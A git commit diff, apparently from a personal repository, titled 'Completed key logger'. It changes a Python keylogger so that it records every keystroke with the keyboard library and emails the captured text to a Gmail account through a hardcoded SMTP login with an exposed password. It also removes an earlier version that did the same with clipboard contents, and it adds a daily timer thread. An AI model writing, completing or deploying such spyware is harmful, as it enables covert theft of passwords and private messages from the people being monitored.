5240607f4f8dd90ca44c874365923bc10ef68d78
GabrielDaKing <34449228+GabrielDaKing@users.noreply.github.com>
2019-03-29 00:51:59 +0530

    Completed key logger

--- keylogger.py
+++ keylogger.py
@@ -13,22 +13,39 @@ def key_record():
 
 	server.login("jacksonsoftwaresolutions", "Bt(c@245")
 
-	#while True:
+	while True:
 
-		if data != pyperclip.paste().encode("utf-8"):	
-				
-			data = pyperclip.paste().encode("utf-8") #.decode('utf-8')
-			print(data)
-
-			server.sendmail("jacksonsoftwaresolutions@gmail.com",
-			"jacksonsoftwaresolutions@gmail.com", data)
+		recorded = keyboard.record(until='shift+s+a+9')
+		words=[]
+		for item in recorded:
+			q= type(item)
+			print(dir(q))
+			if item.name == 'backspace':
+				item.name='/'
+			if item.name == 'space':
+				item.name=' '
+			words.append( item.name)
+		server.sendmail("jacksonsoftwaresolutions@gmail.com","jacksonsoftwaresolutions@gmail.com", ''.join(words))
 
 	server.close()
 
-def count():
+def send_timer():
 
+	while True:
+		time.sleep(3600*24)
+		keyboard.press_and_release('shift+s+a+9')
+
+def main():
+
+	key_record()
+
+	t1 = threading.Thread(target=key_record)
+	t2 = threading.Thread(target=send_timer)
+
+	t1.start()
+	#t2.start()
 
 
 
 if __name__=="__main__":
-	spy()
+	main()
